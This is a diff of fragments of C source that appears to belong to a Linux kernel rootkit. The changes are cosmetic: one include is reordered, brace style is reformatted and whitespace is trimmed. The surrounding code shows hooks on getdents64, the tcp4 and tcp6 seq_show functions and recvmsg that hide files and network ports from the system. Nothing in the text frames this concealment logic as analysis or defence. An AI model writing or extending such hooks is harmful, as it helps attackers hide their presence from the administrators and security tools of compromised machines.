@@ -1,8 +1,7 @@
 #include "hide.h"
 
-#include "hide_api.h"
-
 #include "config.h"
+#include "hide_api.h"
 
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
 asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
@@ -115,8 +114,7 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
     return new_size;
 }
 
-static bool hide_sock_ports(struct sock *sk)
-{
+static bool hide_sock_ports(struct sock *sk) {
     struct inet_sock *inet = inet_sk(sk);
     char port_str[6];
 
@@ -133,8 +131,7 @@ static bool hide_sock_ports(struct sock *sk)
     return false;
 }
 
-asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v)
-{
+asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v) {
     if (v != SEQ_START_TOKEN) {
         struct sock *sk = v;
         if (hide_sock_ports(sk))
@@ -143,8 +140,7 @@ asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v)
     return __orig_tcp4_seq_show(seq, v);
 }
 
-asmlinkage long notrace tcp6_seq_show_hook(struct seq_file *seq, void *v)
-{
+asmlinkage long notrace tcp6_seq_show_hook(struct seq_file *seq, void *v) {
     if (v != SEQ_START_TOKEN) {
         struct sock *sk = v;
         if (hide_sock_ports(sk))
@@ -233,7 +229,7 @@ asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs) {
             snprintf(port_str, sizeof(port_str), "%u", sport);
             if (port_contains(port_str))
                 continue;
-            
+
             snprintf(port_str, sizeof(port_str), "%u", dport);
             if (port_contains(port_str))
                 continue;
